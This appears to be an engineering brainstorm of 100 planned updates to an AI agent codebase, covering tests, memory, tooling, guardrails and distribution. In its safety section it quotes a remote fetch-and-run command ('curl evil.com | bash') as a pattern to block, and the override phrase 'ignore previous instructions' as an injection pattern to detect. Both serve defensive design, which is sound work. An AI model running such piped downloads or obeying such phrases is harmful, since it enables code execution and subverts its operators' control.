# Xavani Agent — 100 Major Updates Brainstorm

Date: 2026-07-31
Source: deep audit of `xavani-agent` repo — 25,194 tests, 60+ tools, 6 subsystems
Lenses: reliability, intelligence, operability, safety, distribution
Each item: what, where in codebase, why it matters, effort (S/M/L/XL)

Legend: S <1 day | M 1-3 days | L 1-2 weeks | XL >2 weeks

## A. Reliability & Correctness (20 items)

A01. Anti-flake test harness (kill all timing-fragile tests)
  What: Sweep all `for _ in range(N): sleep(X)` patterns across tests. Replace with
        deadline-based `_wait_for_state(predicate, timeout)` helpers.
  Where: tests/gateway/, tests/tools/, tests/agent/, tests/cron/
  Why: The gateway E2E approval tests hang under xdist — the same pattern lurks
       in 20+ other files. Standardize the pattern, fix them all.
  Eff: M

A02. Module-level state hygiene — autouse fixture for every subsystem
  What: Extend `_reset_module_state` in conftest.py to enumerate every module
        that has mutable module-level state (approval, tirith, budget governor,
        MOA, cron) and clear each one.
  Where: tests/conftest.py + subsystem-specific conftest.py
  Why: The tirith module caches `_resolved_path` — a stale cached path poisons
       adjacent tests. Today, only approval/tool registry/approval session
       key are cleared. Subsystem leaks are silent.
  Eff: S

A03. Cross-thread ContextVar verification harness
  What: A test utility that spawns a thread, sets a ContextVar, reads it back
        in the parent, and asserts on fallback behavior. Applied to every
        module that uses ContextVars for session state.
  Where: tests/xavani_state/test_contextvars.py (new)
  Why: The approval deadlock was a ContextVar + env-var interaction. ContextVar
       leaks across xdist workers are the single biggest source of flakes.
  Eff: M

A04. Deterministic test ordering for xdist
  What: Replace `-n auto` with deterministic `--dist loadscope` grouping.
        Tests that use the same subsystem (approval, tirith, cron) run in
        the same worker to prevent cross-worker state poisoning.
  Where: pyproject.toml + CI
  Why: `-n auto` randomly distributes tests, creating rare but real
       cross-worker state interactions. Deterministic grouping kills flakes
       at the architectural level.
  Eff: S

A05. Test failure budget + triage (no test stays red for >1 release)
  What: CI gate: any test failure causing >1 build failure creates a P0
        tracking issue. Auto-dims after N runs. Auto-escalates at N=3.
  Where: CI + GitHub issues + badge
  Why: 11 failing tests accumulated over multiple releases unnoticed. A
       failure budget creates institutional pressure to keep tests green.
  Eff: S

A06. Real-time race detector for threads
  What: Add a test harness that runs candidate modules under
        `pytest-xdist --forked` (not just threaded) to force true race
        conditions instead of fake ones.
  Where: CI xdist config + tests/integration/
  Why: Thread-pool races (MOA, approval, cron) are invisible to `-n auto`
       because all threads share the GIL. Forked execution exposes them.
  Eff: M

A07. Timeout guard for every blocking call in the codebase
  What: Audit every `subprocess.run`, `requests.get`, `urllib.request.urlopen`,
        `socket.*`, `open()` on network paths, `lock.acquire()` in the
        entire `tools/` tree. Every one gets a timeout. No unbounded waits.
  Where: tools/, gateway/, agent/, providers/
  Why: The tirith hang (download never returns) cost 5 test failures and
       ~10 debugging hours. Unbounded waits are a reliability anti-pattern.
  Eff: L

A08. Thread-safe registry for tool schemas
  What: Wrap `tools/registry.py` dict access in a `threading.RLock` or move
        to `contextvars.ContextVar`. Tools currently registered at module
        level in each tool file.
  Where: tools/registry.py + every tool file
  Why: Tool registration happens at import time. If two threads import
       concurrently, registration order is undefined.
  Eff: M

A09. Test database fixtures for session_store integrity
  What: Every session-related test gets a real SQLite tempdb, not MagicMock.
        Test against real schema, not mocks that drift.
  Where: gateway/session.py + tests/gateway/session_fixtures.py (new)
  Why: Mocked session stores pass tests but break production. A real
       SQL store with real WAL semantics catches what mocks cannot.
  Eff: M

A10. Audit logging verbosity level (0=none, 1=decisions, 2=verbose)
  What: One key `XAVANI_AUDIT_LOG` that controls audit write volume.
        Level 0=off, 1=only approval/deny decisions, 2=every tool call.
  Where: tools/approval.py, xavani_operator/audit.py
  Why: Line 1215 logs every `_fire_approval_hook` call regardless. Operators
       of high-throughput gateways (1000+ req/day) need to control disk fill.
  Eff: S

A11. Explicit `max_iterations` circuit breaker for agent loop
  What: Runaway detection: if the model returns identical responses N times
        in a row, break. If it exceeds `XAVANI_MAX_ITERATIONS_PER_TURN`, break.
        Log why.
  Where: run_agent.py (agent.run_conversation)
  Why: A broken integration (MCP server that always errors) can drive the
       model into infinite tool-call loops. The user sees a hung session;
       the bot just sees repeated identical calls.
  Eff: S

A12. Hash-based change detection for all state files
  What: Every state file (~/.xavani/*.yaml, ~/.xavani/*.json, session DB)
        gets a SHA-256 hash of its content. On read, verify hash. If mismatch,
        raise corruption alarm — don't silently continue.
  Where: xavani_memory/, xavani_state/, xavani_cli/config.py
  Why: Silent state corruption is the hardest bug class to debug. A hash
       check at the read boundary turns it into a loud, actionable error.
  Eff: M

A13. Self-healing stale session-store locks
  What: Session-store uses file-based locks (~/.xavani/locks/*.lock). On
        startup, check for stale locks (PID no longer exists on system).
        Garbage-collect them.
  Where: xavani_state/session_store.py
  Why: A crashed agent leaves a stale lock. Next startup blocks forever,
       waiting for a dead process.
  Eff: S

A14. Nondeterministic seed capture (record + replay)
  What: On any failure, capture (random state, time seed, hash seed,
        ContextVar state, env vars, working directory) into a serializable
        blob. Replay tests from the blob to reproduce the exact failure.
  Where: tests/conftest.py + scripts/capture_failure.py
  Why: The tirith hang took 12 probes to isolate because state wasn't
       captured at failure time. Reproducibility is a superpower.
  Eff: M

A15. Fail-fast CLI on invalid config (config doctor)
  What: New slash command `/xavani config doctor`. Validates config.yaml
        schema, required fields, env vars, provider API keys (test each
        against the provider's endpoint), model registry, XAVANI_HOME
        writability, directory permissions.
  Where: xavani_cli/ + xavani_cli/config_diagnostics.py (new)
  Why: Bad config = mysterious runtime failures. A doctor command that runs
       before any model call shifts failures left.
  Eff: S

A16. Preflight gate for long-running ops
  What: Any operation that takes >5s (backtest, long install, complex
        analysis) gets a preflight: verify state file writable, verify
        disk space >500MB, verify no active lock, verify network reachability.
        If any fails, stop before starting.
  Where: run_agent.py + tools/long_running.py (new)
  Why: Preventing a 20-minute backtest from failing at minute 19 because
       the session DB was locked by a stale process. The error message
       must name the resource.
  Eff: M

A17. Dedicated flaky test quarantine directory
  What: tests/flaky/ subdirectory with @pytest.mark.flaky. These run but
        never block the build. Report flakiness metrics per test.
  Where: tests/flaky/ + pytest.ini markers
  Why: Some tests are inherently timing-sensitive (network, real processes).
       A quarantine zone keeps them informative without blocking CI.
  Eff: S

A18. XAVANI_HOME filesystem validation on startup
  What: On xavani startup, verify XAVANI_HOME is: writable, on a filesystem
        with file locking, has > 50MB free, is not a symlink to a network
        mount, is not inside a docker volume backed by NFS.
  Where: xavani_bootstrap.py / xavani.py startup
  Why: A bad XAVANI_HOME = silent corruption. NFS-backed HOME = broken
       session locking. Network mounts = intermittent hangs.
  Eff: S

A19. Test failure root-cause labeling (auto-tag)
  What: When a test fails, capture its traceback, categorize it
        (assertion_error, timeout, attribute_error, import_error, race),
        tag it with a root-cause label, append to flakiness.json.
  Where: tests/conftest.py + pytest hook
  Why: 11 failures were 3 distinct bugs. Today the only way to see that is
       to read the traceback one by one. Auto-tagging lets a dashboard
       show "3 root causes affecting 11 tests" at a glance.
  Eff: S

A20. Global env var isolation via monkeypatch
  What: Every autouse fixture uses monkeypatch for env var changes, never
        os.environ direct mutation. Add a `@pytest.mark.no_global_env_vars`
        audit to catch violations.
  Where: tests/conftest.py + custom plugin
  Why: Env vars are process-global. Direct mutation poisons adjacent tests
       and is the #1 source of parallel-test flakes.
  Eff: M

## B. Intelligence & Reasoning (15 items)

B01. Instinct registry (pattern-completion engine)
  What: Persistent store of observed patterns (tool call chains, failure
        sequences, session-shape clusters). When a new session matches a
        stored pattern, inject the context: "this looks like session X,
        where the fix was Y."
  Where: xavani_memory/instincts.py (new)
  Why: Agents repeat the same mistakes. Pattern completion prevents the
       20th instance of the same tool-call loop.
  Eff: L

B02. Session summarizer with confidence scoring
  What: At session end, generate a summary with a confidence score for
        each fact. Store as (fact, confidence, source). On next session,
        only inject facts with confidence > threshold.
  Where: xavani_memory/summarizer.py
  Why: Current memory injection is all-or-nothing. Confidence scoring
       markedly improves relevance.
  Eff: M

B03. Active learning loop for skill creation
  What: Monitor successful sessions. When a session succeeds with a novel
        workflow (5+ tool calls, non-trivial), auto-propose skill extraction.
  Where: xavani_memory/skill_extractor.py
  Why: Skills encode institutional knowledge. Auto-proposing turns implicit
       knowledge into explicit, shareable knowledge without user effort.
  Eff: M

B04. Multi-agent consensus with explicit disagreement tracking
  What: When multiple models vote, also compute Cohen's kappa. If kappa
        is low (models disagree), flag low-confidence decisions.
  Where: agent/consensus.py
  Why: MOA-style voting produces a consensus, but consensus strength
       matters. A unanimous vote is actionable; a split vote is not.
  Eff: M

B05. Model router V2 (cost-aware + latency-aware)
  What: Track per-provider latency and $/token. Route each call to the
        cheapest provider that meets the latency SLA.
  Where: agent/model_router.py
  Why: Default routing always picks the "best" model — expensive and slow.
       Smart routing saves 60%+ cost for equivalent quality.
  Eff: L

B06. Chain-of-thought budget governor
  What: Track reasoning tokens separately from output tokens. Hard cap per
        turn. When exceeded, compress with a "summarize reasoning so far"
        instruction.
  Where: agent/budget_governor.py
  Why: Reasoning models produce 10x more tokens than they output. Without
       a governor, a single turn can cost $5+.
  Eff: M

B07. Model capability self-assessment
  What: On startup, run a benchmark suite against configured models.
        Score them on tool_use, reasoning, coding, translation. Store scores.
        Route tasks by capability.
  Where: agent/model_benchmark.py (new)
  Why: Users configure models without knowing which is best for what task.
       Empirical benchmarking removes guesswork.
  Eff: M

B08. Episodic memory with full-text search
  What: Every conversation gets indexed (messages, tool calls, outcomes).
        Support queries like "find sessions where approval failed and the
        fix was X."
  Where: xavani_memory/episodic.py (new backend FTS5)
  Why: Episodic memory enables pattern completion and self-improvement.
       Current memory is session-scoped; cross-session search unlocks learning.
  Eff: L

B09. Metacognition — agent estimates own confidence
  What: Before answering, agent estimates P(correct). If < threshold, says
        so and offers alternatives.
  Where: agent/metacognition.py (new)
  Why: Without confidence signaling, users can't tell reliable answers from
       guesses. Metacognition closes the loop.
  Eff: M

B10. Goal decomposition with progress tracking
  What: Complex goals auto-decompose into sub-goals with status tracking.
        Sub-agent spawns for each sub-goal, merges results.
  Where: agent/goal_decomposer.py (new)
  Why: Complex tasks fail when attempted monolithically. Decomposition
       makes them tractable.
  Eff: L

B11. Tool complementarity matrix
  What: Learn which tool combinations are most effective for which task
        types. When a task arrives, suggest the top-K tool chain.
  Where: agent/tool_router.py (new)
  Why: Naive tool selection picks tools one at a time. Empirical chaining
       data shows which sequences work.
  Eff: L

B12. Synthetic adversarial test generation
  What: Generate adversarial prompts for the agent to self-test against.
        Inject failures, edge cases, resource exhaustion scenarios.
  Where: xavani_state/adversarial.py (new)
  Why: Agents only see happy paths. Adversarial testing finds weaknesses
       before users do.
  Eff: L

B13. Feedback loop with explicit reward signals
  What: After each agent action, the user thumbs-up/down/or corrects the
        output. Corrections go into fine-tuning or prompt improvement.
  Where: xavani_cli/interactive_feedback.py (new) + agent/feedback.py
  Why: Most agent interactions are one-shot. Explicit feedback creates
       a learning signal.
  Eff: M

B14. Hierarchical memory (hot/warm/cold)
  What: Hot = active session. Warm = last 10 sessions, fast access.
        Cold = all sessions, archived, on-demand load.
  Where: xavani_memory/hierarchical.py (new)
  Why: Current memory is all-or-nothing. Hot memories load in <1ms;
       cold memories don't slow the loop.
  Eff: M

B15. Calendar/trigger-based agent activation
  What: Schedule agent checks by cron-like rules or event triggers
        (stock price change, git push, calendar event).
  Where: xavani_operator/scheduler.py + cron integration
  Why: Reactive agents only respond when spoken to. Proactive agents
       anticipate needs.
  Eff: L

## C. Operability & Developer Experience (20 items)

C01. One-command install verification (`xavani doctor --full`)
  What: End-to-end install verification: CLI computes checksums of critical
        files, verifies tool discovery, runs health probes, checks for stale
        locks, verifies config files parse, verifies db connections.
  Where: xavani_cli/doctor.py
  Why: Install failures are the #1 support burden. A doctor command that
       answers "is everything working?" removes 90% of support load.
  Eff: S

C02. Structured `SESSION_HANDOFF.md` auto-generation
  What: On session boundary, generate a structured handoff: state files
        touched, tests run, findings, next actions.
  Where: xavani_cli/session_handoff.py
  Why: Users resume sessions across days. Without a handoff, context dies.
  Eff: S

C03. Real-time dashboard (TUI): active agents, queue, cost, model health
  What: curses-based dashboard showing active conversations, queue depth,
        model latencies, cost burn, tool health.
  Where: xavani_observability/dashboard_tui.py (new)
  Why: Operators need at-a-glance status. A text UI runs anywhere SSH works.
  Eff: M

C04. Model latency/quality comparison report
  What: Standard benchmark suite with side-by-side results across providers.
  Where: scripts/benchmark_models.py
  Why: Users need empirical data to choose models, not marketing claims.
  Eff: M

C05. Cost attribution per session / project / model
  What: Tag every API call with (session_id, project, model). Roll up cost
        by each dimension.
  Where: xavani_observability/cost_tracker.py
  Why: Without per-project attribution, cost management is impossible.
  Eff: M

C06. `xavani validate` — comprehensive health check before go-live
  What: Runs a test conversation against every configured provider. Verifies
        tool calls work. Verifies memory operations. Reports readiness.
  Where: xavani_cli/validate.py
  Why: Users go live without verifying integration. A pre-flight check
       catches misconfigurations.
  Eff: S

C07. Auto-discovery of relevant tools per task type
  What: Given an intent ("analyze this log", "fix this test"), discover
        relevant tools from the registry. Suggest them in the prompt.
  Where: agent/tool_discovery.py (new)
  Why: Users don't know available tools. Task-aware discovery surfaces
       the right capability at the right time.
  Eff: M

C08. Per-user preference learning
  What: Track user's most-used tools, preferred providers, preferred output
        formats, common query patterns.
  Where: xavani_memory/preferences.py
  Why: The same user asks similar questions. Learning preferences
       personalizes the experience.
  Eff: M

C09. Session compaction (progressive)
  What: When session exceeds N turns, compact oldest turns into structured
        summaries with fidelity scoring (how well the summary preserves
        the original information).
  Where: agent/context_compressor.py
  Why: Long sessions blow context limits. Progressive compaction keeps
       the signal while dropping the noise.
  Eff: M

C10. Quick-session aliases (`xavani /cron add`, `xavani /bot start`)
  What: Short aliases for common complex commands.
  Where: xavani_cli/aliases.py
  Why: Long commands create friction. Aliases reduce typing burden.
  Eff: S

C11. `--brief` and `--verbose` output modes
  What: Two output modes: `-b/--brief` (results only) and `-v/--verbose`
        (full reasoning trace). Default is adaptive.
  Where: cli.py + run_agent.py
  Why: Users have different information needs. Two modes serve both.
  Eff: S

C12. Plugin API versioning gate
  What: Plugins declare API version. Xavani rejects incompatible plugins
        at load time.
  Where: xavani_cli/plugins.py
  Why: API changes break plugins silently. Version gating makes breakage
       explicit and actionable.
  Eff: M

C13. Typed JSON schema for all config files
  What: Every config file gets a strict JSON schema + validation on load.
  Where: xavani_cli/config.py + schemas/
  Why: Bad config = silent failure. Schema validation surfaces config
       errors at startup.
  Eff: S

C14. Xavani-first integration test suite (own framework)
  What: Integration tests in xavani', not ad-hoc pytest. Common harness
        for: start gateway, send message, verify agent response, check
        state files, teardown.
  Where: tests/integration/ + xavani_test_harness.py
  Why: Integration testing today is ad-hoc pytest. A purpose-built harness
       makes it repeatable and maintainable.
  Eff: M

C15. Statusline API for tmux/screen/zellij
  What: One-line status showing: model, session cost, active tools,
        queue depth. Emit as ANSI escape codes.
  Where: xavani_cli/statusline.py (new)
  Why: Terminal multiplexers show status at a glance. Users see what the
       agent is doing without opening a dashboard.
  Eff: M

C16. Deterministic session naming and tagging
  What: Pattern: `<project>-<type>-<date>` (e.g., `xavani-fix-tirith-20260731`).
        Auto-tag by keywords.
  Where: xavani_state/session_naming.py
  Why: Session discovery is critical for resume. Deterministic naming makes
       it reliable.
  Eff: S

C17. Gateway request tracing with correlation IDs
  What: Assign a correlation ID to every gateway request. Propagate through
        gateway → agent → tools → providers. Trace end-to-end.
  Where: gateway/tracing.py (new)
  Why: Debugging multi-step requests without correlation IDs is guesswork.
  Eff: M

C18. Automatic env var documentation generator
  What: Scan codebase for `os.environ` reads and `os.getenv` calls. Generate
        a documented reference of every env var, its purpose, and its default.
  Where: scripts/generate_env_docs.py
  Why: Env vars are the config plane. Undocumented env vars are invisible.
  Eff: S

C19. Config diff command (`xavani config diff --from backup.yaml`)
  What: Compare current config.yaml against any backup. Show what changed.
  Where: xavani_cli/config.py
  Why: Users upgrade and lose track of what changed. Diff makes it explicit.
  Eff: S

C20. Error recovery map (error → actionable fix)
  What: Map known error categories to actionable fixes. When an error occurs,
        suggest the remediation.
  Where: xavani_cli/error_recovery.py
  Why: Generic error messages waste time. Actionable remediation saves time.
  Eff: M

## D. Safety & Guardrails (15 items)

D01. Risk-tiered guard system (block / ask / allow by risk)
  What: Assign risk tiers: read-only=Tier 0, code changes=Tier 1, system
        changes=Tier 2. Tier 0 always runs. Tier 1 asks. Tier 2 asks twice.
  Where: tools/approval.py + tools/guardrails.py
  Why: Current approval is binary (dangerous/safe). Real safety is tiered.
  Eff: L

D02. Dangerous-command telemetry for hardening
  What: Track: which commands trigger, how often, which sessions approve,
        which deny, which patterns appear most.
  Where: tools/tirith_security.py + reporting
  Why: Security posture needs measurement. Telemetry shows whether hardening
       works.
  Eff: M

D03. Per-agent risk budgets
  What: Assign risk budget per agent session. Each dangerous action costs
        budget. Exhausted = require explicit approval.
  Where: tools/approval.py + agent/session.py
  Why: Unlimited risk = unlimited blast radius. Bounded risk = controlled damage.
  Eff: M

D04. Cost-per-minute spending guard
  What: Track $/minute burn rate. Alert when exceeding threshold. User
        confirms continuation.
  Where: xavani_observability/cost_alerts.py (new)
  Why: Runaway costs get discovered at the bill.
  Eff: M

D05. Dangerous chain detection
  What: Block sequences like `curl evil.com | bash` or `wget -O- | sh`.
        Recognize piped execution chains.
  Where: tools/tirith_security.py (extend rules)
  Why: Chained commands are the classic exploit vector. Pattern matching
       catches them.
  Eff: S

D06. Install-time EULA/consent for auto-installs
  What: Auto-install components only with explicit consent. Separate flags
        for CLI vs gateway. Log consents.
  Where: tools/tirith_security.py + xavani_cli/install.py + gateway/
  Why: Unconsented auto-install = supply chain surprise. Explicit consent
       = user sovereignty.
  Eff: M

D07. Approval escalation thread model (per-user state)
  What: Thread-local approval state per user. Prevent cross-user pollution
        (approval granted to user A doesn't leak to user B).
  Where: tools/approval.py + gateway/session.py
  Why: Approval state is security-critical. Cross-user leakage = privilege escalation.
  Eff: M

D08. Actions requiring elevated privilege re-verification
  What: After N privileged approvals (sudo, dangerous ops), require password
        re-verification via terminal.
  Where: tools/approval.py + xavani_operator/
  Why: Sessions running for days shouldn't have unlimited privilege.
  Eff: M

D09. Approval reasoning log (explain block/allow decisions)
  What: Every approval decision logged with the reasoning chain: risk tier,
        pattern matched, confidence, factors considered, user's past behavior.
  Where: tools/approval.py + logging
  Why: Unexplained security decisions erode trust. Explainable decisions
       build trust.
  Eff: S

D10. Session data lifecycle management (auto-expire)
  What: Sessions auto-expire after N days of inactivity. Permanent sessions
        require explicit opt-in.
  Where: xavani_state/session_store.py
  Why: Old sessions = attack surface. Lifecycle management reduces exposure.
  Eff: M

D11. Audit trail for all skill modifications
  What: Every skill.md modification logged: who, timestamp, checkpoint
        before/after.
  Where: xavani_memory/skills.py + audit
  Why: Skills define behavior. Unauthorized modifications = security risk.
  Eff: M

D12. Rate limiting on all outbound API calls
  What: Global concurrency + per-provider rate limiting on every HTTP call.
  Where: agent/api_client.py
  Why: Uncontrolled outbound calls = rate limit bans. Controlled calls survive.
  Eff: M

D13. Sanitizer for LLM-generated output before execution
  What: Any tool call, file write, or command execution auto-sanitizes
        markdown code blocks. Prevents injection.
  Where: tools/code_execution_tool.py + tools/command_sanitizer.py
  Why: LLMs generate code blocks. Unsanitized execution = arbitrary code injection.
  Eff: M

D14. Prompt injection detection and deflection — scope honestly
  What: Capture known injection patterns (explicit instruction overrides like
        "ignore previous instructions", known jailbreak templates). Log every
        attempt. This is pattern matching against known attacks, not general
        semantic detection — that problem is unsolved.
  Where: agent/prompt_guard.py (new)
  Why: Known-pattern detection catches 80% of real-world attacks. General
       semantic detection is unsolved; a security claim of "solved" is wrong.
  Eff: M

D15. Signal-based timeout for all blocking operations
  What: SIGALRM-based timeout guard. Beyond max wait, raise TimeoutError
        with stack trace + operation description.
  Where: tools/timeout_guard.py (new)
  Why: Unbounded waits hang sessions. Timeouts surface failures.
  Eff: S

## E. Observability & Debugging (10 items)

E01. Latency histograms per tool (prometheus-compatible)
  What: Track p50/p95/p99 latency per tool. Prometheus-compatible /metrics
        endpoint.
  Where: tools/metrics.py + xavani_observability/prometheus.py
  Why: Aggregates hide variance. Histograms reveal tail problems.
  Eff: M

E02. Full distributed tracing (gateway → agent → tool → provider)
  What: UUID-per-request tracing. Each span tags: component, operation, status.
  Where: xavani_observability/tracer.py
  Why: Distributed debugging requires correlation. UUIDs make it possible.
  Eff: L

E03. Anomaly detection on tool-call success rate
  What: Rolling success rate (5min). Alert when < threshold.
  Where: xavani_observability/anomaly_detector.py (new)
  Why: Degraded tools = degraded experience. Anomaly detection finds it early.
  Eff: M

E04. Span waterfall view for every agent turn
  What: For each turn, generate a waterfall: every tool call as a span with
        duration + status. CLI, JSON, HTML outputs.
  Where: xavani_observability/waterfall.py (new)
  Why: Understanding where time goes requires visual breakdown. Waterfall
       shows it.
  Eff: M

E05. Debug-friendly state dumps
  What: `xavani state dump` — write all in-memory state (session, approval,
        budgets, model, memory) to JSON for inspection.
  Where: xavani_cli/commands.py
  Why: Debugging blind = debugging slow. State visibility accelerates it.
  Eff: S

E06. Error budget tracking per subsystem
  What: Define SLO per subsystem (gateway 99.9%, agent 99.5%, tools 99%).
        Track budget. Alert when violated.
  Where: xavani_observability/error_budget.py (new)
  Why: "It broke" is unactionable. "Budget exhausted" triggers remediation.
  Eff: M

E07. Expandable stack traces (abridged with --full)
  What: Default: show app frames only (hide stdlib/site-packages). --full
        shows everything.
  Where: xavani_cli/error_formatter.py (new)
  Why: 1000-line traces hide the signal. Abridged traces reveal it.
  Eff: S

E08. Tool-level health checks (periodic)
  What: Every tool gets a `check_health()` method. Aggregated into a health
        endpoint.
  Where: tools/registry.py + xavani_observability/health.py
  Why: Reactive debugging = slow. Proactive health = early detection.
  Eff: M

E09. LLM-as-debugger on failure
  What: On failure, agent introspects: state dump, session context, recent
        tool calls. Proposes root cause + fix.
  Where: agent/debugger.py (new)
  Why: Debugging is reasoning. LLMs can reason about their own failures.
  Eff: M

E10. Performance regression detector in CI
  What: Benchmark on every PR. Compare against main. Fail if p95 regresses
        >20%.
  Where: CI + scripts/benchmark.py
  Why: Performance regressions accumulate invisibly. CI detection prevents them.
  Eff: M

## F. Distribution & Ecosystem (10 items)

F01. Homebrew formula (official release)
  What: brew install enternovate/xavani/xavani
  Eff: M

F02. Universal binary distribution (PyInstaller)
  What: Standalone binary for users without Python. Per-platform: macOS-ARM,
  macOS-x86_64, Linux-x86_64, Linux-ARM64, Windows.
  Eff: L

F03. Per-platform native installers (brew, apt, winget)
  What: Platform-native install channels with checksums, signing, auto-update.
  Eff: L

F04. Marketplace for Xavani skills
  What: Search/discovery/install for community skills. Reviews, ratings.
  Eff: XL

F05. Plugin framework for custom tools (sandboxed)
  What: Sandboxed custom tool execution. Resource limits, audit, signing.
  Eff: L

F06. `xavani-core` npm package
  What: Core agent logic exposed as a library for Node.js wrappers (npx-style
  direct invocation, no Python dependency management on the host).
  Where: packaging/npm/ (new), via PyInstaller bundle + thin Node wrapper
  Why: Node.js wrappers are requested for tooling integrations (CI plugins,
       custom dashboards). An npm package eliminates Python install friction.
  Eff: L

F07. VS Code extension
  What: Sidebar agent, inline assistance, extension host.
  Eff: L

F08. Neovim plugin
  What: `:Xavani` command + inline completion.
  Eff: M

F09. JetBrains plugin
  What: Tool window + actions for all JetBrains IDEs.
  Eff: L

F10. Cloud-hosted managed instance
  What: Hosted Xavani with SSH into managed VMs. Auth via API key.
  Eff: XL

## G. Autonomy & Proactivity (10 items)

G01. Autonomous root-cause diagnosis on failure
  What: On failure, agent automatically: captures state, runs bisection,
  formulates root-cause hypothesis.
  Eff: L

G02. Autonomous pattern consolidation
  What: Analyze memory. When 2+ sessions share a pattern, auto-propose skill
  extraction.
  Eff: M

G03. Self-healing degradation detection
  What: Monitor metrics. Auto-restart, rollback, or alert when thresholds
  breach.
  Eff: L

G04. Proactive disclosure ("here's what might break")
  What: Before risky operations, agent discloses risks + provides rollback plan.
  Eff: M

G05. Scheduled maintenance windows
  What: Automated maintenance during low-usage periods: compact, vacuum
  databases, rotate logs, update indices.
  Eff: M

G06. Agent-initiated session continuation
  What: On detecting unfinished work, agent offers to continue from where
  it left off.
  Eff: M

G07. Smart notification filtering (no alert fatigue)
  What: Intelligent filtering. Bundle low-priority alerts. Never more than
  N/hour.
  Eff: M

G08. Pre-computed context prefetch
  What: Before user asks, contextually prefetch relevant info (prior
  session, repo state, open PRs/git status if in a repo, calendar events
  if connected). Driven by scheduled triggers or explicit hooks, not
  speculative event subscriptions that don't exist yet.
  Eff: M

G09. Autonomous dependency security scanning
  What: Scan dependency tree on every PR and on a scheduled cadence. Auto-create
  PRs for CVE fixes. Daily schedule is config-driven; PR-time scanning is
  always-on.
  Eff: M

G10. Learning rate limits (sliding window per user)
  What: Adaptive learning rate per user. High-activity = slower. Low = faster.
  Eff: L

---

## Implementation Priority (top 20 by impact/effort ratio)

  1. A01 — Anti-flake test harness cupcakes
  2. A13 — Self-healing stale session-store locks
  3. A17 — Test quarantine directory
  4. A20 — Global env var isolation
  5. D15 — Signal-based timeout
  6. E05 — Debug-friendly state dumps
  7. E07 — Expandable stack traces
  8. C06 — validate command
  9. C13 — Typed JSON schema for configs
 10. C16 — Session naming convention
 11. A07 — Timeout guard everywhere
 12. A15 — Fail-fast CLI (config doctor)
 13. D01 — Risk-tiered guards
 14. B06 — Chain-of-thought budget
 15. B12 — Synthetic adversarial tests
 16. E03 — Anomaly detection
 17. C01 — Doctor command (full install verification)
 18. G07 — Smart notifications
 19. F02 — Universal binary
 20. D05 — Dangerous chain detection
